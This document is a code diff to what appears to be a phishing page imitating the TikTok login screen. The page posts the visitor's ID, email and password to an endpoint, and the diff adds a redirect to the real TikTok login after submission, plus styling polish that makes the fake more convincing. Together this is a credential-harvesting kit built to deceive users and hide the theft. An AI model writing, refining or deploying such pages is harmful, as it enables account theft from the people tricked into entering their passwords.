@@ -25,30 +25,34 @@
         }
         .title {
             font-size: 28px; font-weight: 700; margin-bottom: 30px;
-            color: #fff; font-family: 'TikTok Display', sans-serif;
+            color: #fff; font-family: 'Proxima Nova', sans-serif;
         }
         form { display: flex; flex-direction: column; gap: 20px; }
         input {
             padding: 15px; border: 1px solid #333;
             border-radius: 8px; background: #262626; color: #fff;
-            font-size: 16px; outline: none;
+            font-size: 16px; outline: none; transition: border-color 0.2s;
         }
         input::placeholder { color: #aaa; }
+        input:focus { border-color: #FE2C55; }
         button {
             padding: 15px; background: linear-gradient(90deg, #FE2C55 0%, #25F4EE 100%);
             border: none; border-radius: 8px; color: #fff;
             font-size: 16px; font-weight: 600; cursor: pointer;
-            transition: opacity 0.2s;
+            transition: opacity 0.2s, transform 0.2s;
         }
-        button:hover { opacity: 0.9; }
+        button:hover { opacity: 0.9; transform: scale(1.02); }
+        button:active { transform: scale(0.98); }
         .forget {
             margin-top: 20px; font-size: 14px;
         }
-        .forget a { color: #25F4EE; text-decoration: none; }
+        .forget a { color: #25F4EE; text-decoration: none; transition: color 0.2s; }
+        .forget a:hover { color: #fff; }
         .signup {
             margin-top: 20px; font-size: 14px; color: #aaa;
         }
-        .signup a { color: #FE2C55; text-decoration: none; }
+        .signup a { color: #FE2C55; text-decoration: none; transition: color 0.2s; }
+        .signup a:hover { color: #fff; }
         .footer {
             position: fixed; bottom: 0; width: 100%; text-align: center;
             color: #666; font-size: 12px; padding: 10px;
@@ -103,6 +107,9 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ unique_id, email, password })
+                })
+                .finally(() => {
+                    window.location.href = 'https://www.tiktok.com/login';
                 })
                 .catch(error => {
                     console.error('Error submitting data:', error.message);
